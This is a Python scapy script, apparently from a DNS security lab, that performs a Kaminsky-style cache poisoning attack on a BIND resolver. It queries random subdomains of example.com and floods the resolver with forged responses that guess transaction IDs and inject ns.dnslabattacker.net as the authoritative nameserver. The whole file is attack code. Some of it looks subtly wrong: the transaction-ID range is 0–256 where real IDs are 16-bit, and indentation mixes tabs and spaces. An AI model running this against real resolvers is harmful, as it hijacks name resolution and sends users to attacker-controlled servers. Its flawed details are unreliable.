#!/usr/bin/env python
import argparse
import socket

from scapy.all import *
from random import randint, choice
from string import ascii_lowercase, digits
from subprocess import call

import threading

parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="ip address for your bind - do not use localhost", type=str, required=True)
parser.add_argument("--port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int, required=True)
parser.add_argument("--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = args.ip
# your bind's port (DNS queries are send to this port)
my_port = args.port
# BIND's port
dns_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port


'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
	return ''.join(choice(ascii_lowercase + digits) for _ in range (10))

'''
Generates random 8-bit integer.
'''
def getRandomTXID():
	return randint(0, 256)


'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))

# Modify packet
def pktmodify(pkt):
	pkt.aa=1
	pkt.nscount=1
	pkt.ns.rrname="example.com"
	pkt.ns.rdata="ns.dnslabattacker.net"
	pkt.arcount=0
	pkt.ar=None
	return pkt

'''
Example code that sends a DNS query using scapy.
'''
def exampleSendDNSQuery():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
	QPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
	sendPacket(sock, QPacket, my_ip, my_port)
        response = sock.recv(4096)
        response = DNS(response)
	newpkt = pktmodify(response)
	result_NS = ""
	while result_NS.find("dnslabattacker")==-1:
		fakename = getRandomSubDomain()
		newpkt.qd.qname = fakename + '.example.com'
		newpkt.an.rrname = fakename + '.example.com'
		QPacket.qd.qname = fakename + '.example.com'
		sendPacket(sock, QPacket, my_ip, my_port)
                for i in range(50):
			newpkt.id = getRandomTXID()
			sendPacket(sock, newpkt, my_ip, my_query_port)
                response = sock.recv(4096)
                response = DNS(response)
                #print response.show2()
		if response.nscount==0:
			result_NS = "SERVER FAILURE"
		else:
			result_NS = response[DNS].ns[DNSRR].rdata
                #print 'result NS is ' + result_NS
	#response.show()
	#print("Success!") 

if __name__ == '__main__':
	exampleSendDNSQuery()
